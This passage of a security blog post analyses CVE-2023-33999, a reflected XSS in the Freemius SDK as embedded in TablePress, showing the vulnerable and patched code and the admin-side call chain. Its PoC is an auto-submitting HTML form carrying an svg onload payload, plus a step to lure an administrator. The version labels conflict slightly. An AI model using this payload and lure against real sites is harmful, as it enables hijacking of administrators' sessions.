2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;TablePress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;about-freemius-sdk&#34;&gt;&lt;span&gt;About Freemius SDK&lt;/span&gt;&#xA;  &lt;a href=&#34;#about-freemius-sdk&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; is a library (Software Development Kit) for &lt;strong&gt;WordPress&lt;/strong&gt;, helping plugin and theme developers easily add the following features to their products:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;License management&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Handling &lt;strong&gt;freemium / premium&lt;/strong&gt; versions&lt;/li&gt;&#xA;&lt;li&gt;Allowing users to &lt;strong&gt;connect accounts (opt-in)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Collecting &lt;strong&gt;usage statistics (analytics)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Managing &lt;strong&gt;payments and renewals&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Displaying &lt;strong&gt;upsell / upgrade&lt;/strong&gt; in the WordPress dashboard&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; is not a standalone plugin; it is embedded directly into the source code of other plugins or themes. Therefore, when a vulnerability exists in &lt;strong&gt;Freemius SDK&lt;/strong&gt;, many products are affected. The plugin &lt;a href=&#34;https://wordpress.org/plugins/tablepress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;TablePress&lt;/strong&gt;&lt;/a&gt; is one of the impacted cases, so it was chosen for analysis.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/**&#xA; * A helper method to fetch GET/POST user input with an optional default value when the input is not set.&#xA; * @author Vova Feldman (@svovaf)&#xA; *&#xA; * @param string      $key&#xA; * @param mixed       $def&#xA; * @param string|bool $type Since 1.2.1.7 - when set to &amp;#39;get&amp;#39; will look for the value passed via querystring, when&#xA; *                          set to &amp;#39;post&amp;#39; will look for the value passed via the POST request&amp;#39;s body, otherwise,&#xA; *                          will check if the parameter was passed in any of the two.&#xA; *&#xA; * @return mixed&#xA; */&#xA;function fs_request_get( $key, $def = false, $type = false ) {&#xA;    if ( is_string( $type ) ) {&#xA;        $type = strtolower( $type );&#xA;    }&#xA;&#xA;    /**&#xA;     * Note to WordPress.org Reviewers:&#xA;     *  This is a helper method to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&amp;#39;s usage.&#xA;     */&#xA;    switch ( $type ) {&#xA;        case &amp;#39;post&amp;#39;:&#xA;            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;&#xA;            break;&#xA;        case &amp;#39;get&amp;#39;:&#xA;            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;&#xA;            break;&#xA;        default:&#xA;            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;&#xA;            break;&#xA;    }&#xA;&#xA;    return $value;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;fs_request_get()&lt;/code&gt; function is used to &lt;strong&gt;retrieve the value of a parameter from a user request&lt;/strong&gt; (GET, POST, or both), based on the provided key name. If the parameter does not exist, the function returns the default value. The &lt;code&gt;$type&lt;/code&gt; parameter allows explicitly specifying whether the data source is &lt;code&gt;GET&lt;/code&gt;, &lt;code&gt;POST&lt;/code&gt;, or all (&lt;code&gt;REQUEST&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The returned data is not sanitized or escaped. If this value is printed to the browser (for example, using &lt;code&gt;echo&lt;/code&gt;) without proper handling, an attacker can inject malicious JavaScript code through request parameters, leading to a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function fs_request_get_raw( $key, $def = false, $type = false ) {&#xA;    if ( is_string( $type ) ) {&#xA;        $type = strtolower( $type );&#xA;    }&#xA;&#xA;    /**&#xA;     * Note to WordPress.org reviewers:&#xA;     * This is a helper function to fetch GET/POST user input with an optional default value when the input is not set. The actual sanitization is done in the scope of the function&amp;#39;s usage.&#xA;     */&#xA;    switch ( $type ) {&#xA;        case &amp;#39;post&amp;#39;:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Missing&#xA;            $value = isset( $_POST[ $key ] ) ? $_POST[ $key ] : $def;&#xA;            break;&#xA;        case &amp;#39;get&amp;#39;:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Recommended&#xA;            $value = isset( $_GET[ $key ] ) ? $_GET[ $key ] : $def;&#xA;            break;&#xA;        default:&#xA;            // phpcs:ignore WordPress.Security.NonceVerification.Recommended&#xA;            $value = isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $def;&#xA;            break;&#xA;    }&#xA;&#xA;    // Don&amp;#39;t unslash if the value itself is empty (empty string, null, empty array etc).&#xA;    return empty( $value ) ? $value : wp_unslash( $value );&#xA;}&#xA;&#xA;function fs_sanitize_input( $input ) {&#xA;    if ( is_array( $input ) ) {&#xA;        foreach ( $input as $key =&amp;gt; $value ) {&#xA;            $input[ $key ] = fs_sanitize_input( $value );&#xA;        }&#xA;    } else {&#xA;        // Allow empty values to pass through as-is, like `null`, `&amp;#39;&amp;#39;`, `0`, `&amp;#39;0&amp;#39;` etc.&#xA;        $input = empty( $input ) ? $input : sanitize_text_field( $input );&#xA;    }&#xA;&#xA;    return $input;&#xA;}&#xA;&#xA;function fs_request_get( $key, $def = false, $type = false ) {&#xA;    return fs_sanitize_input( fs_request_get_raw( $key, $def, $type ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch separates &lt;strong&gt;data retrieval&lt;/strong&gt; and &lt;strong&gt;data sanitization&lt;/strong&gt; into two distinct steps.&#xA;&lt;code&gt;fs_request_get_raw()&lt;/code&gt; only retrieves the raw value from GET/POST/REQUEST and removes escaping with &lt;code&gt;wp_unslash()&lt;/code&gt;, while &lt;code&gt;fs_sanitize_input()&lt;/code&gt; is responsible for sanitizing (even when the input is an array) using &lt;code&gt;sanitize_text_field()&lt;/code&gt;. Finally, &lt;code&gt;fs_request_get()&lt;/code&gt; always returns sanitized data. As a result, malicious data is no longer returned directly, reducing the risk of &lt;strong&gt;Reflected XSS&lt;/strong&gt; exploitation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;fs_request_get()&lt;/code&gt; function is called in many places.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#34; title=&#34;127 references&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/call.png&#34; data-sub-html=&#34;&lt;h2&gt;Call&lt;/h2&gt;&lt;p&gt;127 references&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#39; alt=&#34;Call&#34; height=&#34;165&#34; width=&#34;702&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;127 references&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;so the tracing process is somewhat time-consuming.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#34; title=&#34;Locations where fs_request_get is called&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Locations where fs_request_get is called&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#39; alt=&#34;Search&#34; height=&#34;663&#34; width=&#34;1616&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Locations where fs_request_get is called&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;dynamic_init()&lt;/code&gt; function calls &lt;code&gt;fs_request_get()&lt;/code&gt; to retrieve the values of keys such as &lt;code&gt;purchased_plan&lt;/code&gt; and &lt;code&gt;purchase_email&lt;/code&gt; from the request, and then uses these values to display a license purchase confirmation message in the admin page. These values are not sanitized before being included in the displayed content, leading to the risk that user-controlled data can inject malicious code and cause a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;For this message to appear, 3 conditions must be met:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;The request must be called from the Admin Dashboard&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;is_user_in_admin()&#xA;/**&#xA; * Check if a real user is visiting the admin dashboard.&#xA; *&#xA; * @author Vova Feldman (@svovaf)&#xA; * @since  1.1.7&#xA; *&#xA; * @return bool&#xA; */&#xA;function is_user_in_admin() {&#xA;    return (&#xA;        is_admin() &amp;amp;&amp;amp;&#xA;        ! self::is_ajax() &amp;amp;&amp;amp;&#xA;        ! self::is_cron() &amp;amp;&amp;amp;&#xA;        ! self::is_admin_post()&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Check whether the user has already connected (opted-in) to Freemius.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;is_registered()&#xA;/**&#xA; * Check if user has connected his account (opted-in).&#xA; *&#xA; * Note:&#xA; *      If the user opted-in and opted-out on a later stage,&#xA; *      this will still return true. If you want to check if the&#xA; *      user is currently opted-in, use:&#xA; *          `$fs-&amp;gt;is_registered() &amp;amp;&amp;amp; $fs-&amp;gt;is_tracking_allowed()`&#xA; *&#xA; * @author Vova Feldman (@svovaf)&#xA; * @since  1.0.1&#xA; *&#xA; * @param bool $ignore_anonymous_state Since 2.5.1&#xA; *&#xA; * @return bool&#xA; */&#xA;function is_registered( $ignore_anonymous_state = false ) {&#xA;    return (&#xA;        is_object( value: $this-&amp;gt;_user ) &amp;amp;&amp;amp;&#xA;        (&#xA;            $this-&amp;gt;is_premium() ||&#xA;            $ignore_anonymous_state ||&#xA;            ! $this-&amp;gt;is_anonymous()&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After successfully setting up the plugin, the system sends a confirmation email to complete this connection (opt-in) process.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; title=&#34;Connect to Freemius&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; data-sub-html=&#34;&lt;h2&gt;Opt In&lt;/h2&gt;&lt;p&gt;Connect to Freemius&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#39; alt=&#34;Opt In&#34; height=&#34;238&#34; width=&#34;1380&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Connect to Freemius&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;The request must contain the &lt;code&gt;purchase_completed&lt;/code&gt; parameter&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;fs_request_has( &amp;#39;purchase_completed&amp;#39; )&#xA;function fs_request_has( $key ) {&#xA;    return isset( $_REQUEST[ $key ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;dynamic_init()&lt;/code&gt; is called inside the &lt;code&gt;fs_dynamic_init()&lt;/code&gt; function&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function fs_dynamic_init( $module ) {&#xA;    $fs = Freemius::instance( $module[&amp;#39;id&amp;#39;], $module[&amp;#39;slug&amp;#39;], true );&#xA;    $fs-&amp;gt;dynamic_init( $module );&#xA;&#xA;    return $fs;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function creates an instance of &lt;code&gt;Freemius&lt;/code&gt; and calls &lt;code&gt;dynamic_init()&lt;/code&gt; to initialize the SDK with the configuration from &lt;code&gt;$module&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;fs_dynamic_init()&lt;/code&gt; is called in the file &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; (the &lt;code&gt;tb_tp_fs()&lt;/code&gt; function)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function tb_tp_fs() {&#xA;    global $tb_tp_fs;&#xA;&#xA;    if ( ! isset( $tb_tp_fs ) ) {&#xA;        // Include Freemius SDK.&#xA;        require_once __DIR__ . &amp;#39;/libraries/freemius/start.php&amp;#39;;&#xA;&#xA;        $tb_tp_fs = fs_dynamic_init( array(&#xA;            &amp;#39;id&amp;#39;                =&amp;gt; &amp;#39;10340&amp;#39;,&#xA;            &amp;#39;slug&amp;#39;              =&amp;gt; &amp;#39;tablepress&amp;#39;,&#xA;            &amp;#39;type&amp;#39;              =&amp;gt; &amp;#39;plugin&amp;#39;,&#xA;            &amp;#39;public_key&amp;#39;        =&amp;gt; &amp;#39;pk_b215ca1bb4041cf43ed137ae7665b&amp;#39;,&#xA;            &amp;#39;is_premium&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;has_addons&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;has_paid_plans&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;menu&amp;#39;              =&amp;gt; array(&#xA;                &amp;#39;slug&amp;#39;    =&amp;gt; &amp;#39;tablepress&amp;#39;,&#xA;                &amp;#39;contact&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;support&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;account&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;pricing&amp;#39; =&amp;gt; false,&#xA;            ),&#xA;            &amp;#39;opt_in_moderation&amp;#39; =&amp;gt; array(&#xA;                &amp;#39;new&amp;#39;       =&amp;gt; true,&#xA;                &amp;#39;updates&amp;#39;   =&amp;gt; false,&#xA;                &amp;#39;localhost&amp;#39; =&amp;gt; false,&#xA;            ),&#xA;            &amp;#39;is_live&amp;#39;           =&amp;gt; true,&#xA;        ) );&#xA;    }&#xA;&#xA;    return $tb_tp_fs;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Loads the Freemius SDK&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;fs_dynamic_init()&lt;/code&gt; with the configuration for TablePress&lt;/li&gt;&#xA;&lt;li&gt;Stores the instance in the global variable &lt;code&gt;$tb_tp_fs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;tb_tp_fs()&lt;/code&gt; is called directly in &lt;code&gt;tablepress/tablepress.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Init Freemius.&#xA;tb_tp_fs();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Because &lt;code&gt;tablepress.php&lt;/code&gt; is the first file loaded by WordPress when the plugin runs, the Freemius SDK is also initialized from here.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, the flow &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; → &lt;code&gt;tb_tp_fs()&lt;/code&gt; → &lt;code&gt;fs_dynamic_init()&lt;/code&gt; → &lt;code&gt;dynamic_init()&lt;/code&gt; is always executed whenever WordPress processes a request and the TablePress plugin is loaded. This means that the logic inside &lt;code&gt;dynamic_init()&lt;/code&gt;, including reading data from the request (such as &lt;code&gt;purchased_plan&lt;/code&gt;, &lt;code&gt;purchase_email…&lt;/code&gt;), will always have a chance to be triggered when users access endpoints related to the admin area.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#34; title=&#34;Triggering the vulnerability&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/trigger.png&#34; data-sub-html=&#34;&lt;h2&gt;Trigger&lt;/h2&gt;&lt;p&gt;Triggering the vulnerability&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#39; alt=&#34;Trigger&#34; height=&#34;1056&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Triggering the vulnerability&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;However, in order for the vulnerability to be exploited with unauthenticated privileges, the attacker cannot directly interact with it but must build an indirect scenario, such as luring an administrator to visit a malicious website. In that case, the admin’s browser may automatically send a request to the logged-in WordPress admin page, carrying parameters controlled by the attacker, thereby triggering unintended behavior during the plugin’s processing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;PoC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a malicious website that automatically sends a request to the WordPress admin page:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/index.php&amp;#34;&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;purchase&amp;amp;#95;email&amp;#34; value=&amp;#34;&amp;amp;lt;svg&amp;amp;#47;onload&amp;amp;#61;alert&amp;amp;#40;&amp;amp;#41;&amp;amp;gt;&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit request&amp;#34; /&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;);&#xA;      document.forms[0].submit();&#xA;    &amp;lt;/script&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send the link of this website to a user with administrator privileges and trick them into visiting it, thereby triggering the request when the malicious page is loaded.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2023-33999 originates from &lt;strong&gt;unsanitized input handling&lt;/strong&gt; in &lt;code&gt;fs_request_get()&lt;/code&gt; of the Freemius SDK, allowing user-controlled data to be directly injected into content displayed in the admin page. Because Freemius is widely embedded in many plugins and themes, the impact of this vulnerability is much greater than that of a single plugin. Version 2.5.10 fixes the issue by &lt;strong&gt;separating data retrieval and sanitization&lt;/strong&gt;, ensuring that all data from requests is sanitized before being used.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key 